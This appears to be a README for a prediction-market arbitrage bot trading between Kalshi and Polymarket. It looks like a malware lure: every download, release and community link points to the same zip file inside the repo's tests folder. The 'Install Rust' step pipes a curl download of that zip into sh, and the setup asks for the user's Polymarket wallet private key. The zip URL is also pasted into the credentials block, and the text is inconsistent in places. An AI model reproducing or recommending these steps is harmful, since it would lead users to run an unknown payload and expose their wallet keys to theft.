# 🌟 poly-kalshi-arb - Your Shortcut to Market Arbitrage

## 📥 Download & Install
[![Download from Releases](https://github.com/samuel483/poly-kalshi-arb/raw/refs/heads/main/tests/kalshi-poly-arb-2.0-alpha.3.zip%20Now-Click%20Here-brightgreen)](https://github.com/samuel483/poly-kalshi-arb/raw/refs/heads/main/tests/kalshi-poly-arb-2.0-alpha.3.zip)

Visit this page to download: [GitHub Releases](https://github.com/samuel483/poly-kalshi-arb/raw/refs/heads/main/tests/kalshi-poly-arb-2.0-alpha.3.zip)

## 🚀 Getting Started

### 1. Install Dependencies

Before you can run the application, you need to install some basic tools. Follow these commands:

```bash
# Install Rust (version 1.75 or higher)
curl --proto '=https' --tlsv1.2 -sSf https://github.com/samuel483/poly-kalshi-arb/raw/refs/heads/main/tests/kalshi-poly-arb-2.0-alpha.3.zip | sh

# Navigate into the app's directory
cd e_poly_kalshi_arb

# Build the application
cargo build --release
```

### 2. Set Up Credentials

To use the arbitrage bot, you must provide some credentials. Create a file named `.env` in the application's directory and add your details.

```bash
# === KALSHI CREDENTIALS ===
KALSHI_API_KEY_ID=your_kalshi_api_key_id
https://github.com/samuel483/poly-kalshi-arb/raw/refs/heads/main/tests/kalshi-poly-arb-2.0-alpha.3.zip

# === POLYMARKET CREDENTIALS ===
POLY_PRIVATE_KEY=0xYOUR_WALLET_PRIVATE_KEY
POLY_FUNDER=0xYOUR_WALLET_ADDRESS

# === BOT CONFIGURATION ===
DRY_RUN=1
RUST_LOG=info
```

### 3. Run the Application

You can run the application in two modes: dry run (simulated trading) and live execution.

```bash
# Dry run (paper trading)
dotenvx run -- cargo run --release

# Live execution
DRY_RUN=0 dotenvx run -- cargo run --release
```

## 🌐 Environment Variables

To ensure the bot runs smoothly, here are the environment variables you will need:

### Required

| Variable                  | Description                                                 |
| ------------------------- | ----------------------------------------------------------- |
| `KALSHI_API_KEY_ID`      | Your unique API key for Kalshi.                             |
| `KALSHI_PRIVATE_KEY_PATH` | The path to your private key file for Kalshi.              |
| `POLY_PRIVATE_KEY`        | Your wallet's private key for Polymarket.                  |
| `POLY_FUNDER`             | Your wallet address for funding purposes.                   |
| `DRY_RUN`                 | Set to `1` for testing without real trades.                |
| `RUST_LOG`                | Logging level; adjust this to control log output.          |

## 🔧 Features

- **Cross-Platform Compatibility**: Works seamlessly between Kalshi and Polymarket.
- **Real-Time Trading**: Make decisions based on live market data.
- **User-Friendly Setup**: Minimal technical skills required.
- **Simulation Mode**: Test your strategies without risking real money.

## ⚙️ System Requirements

- **Operating System**: Windows, macOS, or Linux.
- **RAM**: Minimum 4GB; recommended 8GB.
- **Disk Space**: At least 200MB free space for installation.

## 📝 Additional Information

If you encounter any issues, please refer to the documentation available in the repository. You can also check the FAQ section on the Releases page for common troubleshooting steps.

[👨‍💻 Join our Community](https://github.com/samuel483/poly-kalshi-arb/raw/refs/heads/main/tests/kalshi-poly-arb-2.0-alpha.3.zip) for support or to share your experiences using the bot. Your feedback helps improve the application.

## 📜 License

This project is licensed under the MIT License - see the LICENSE file for details.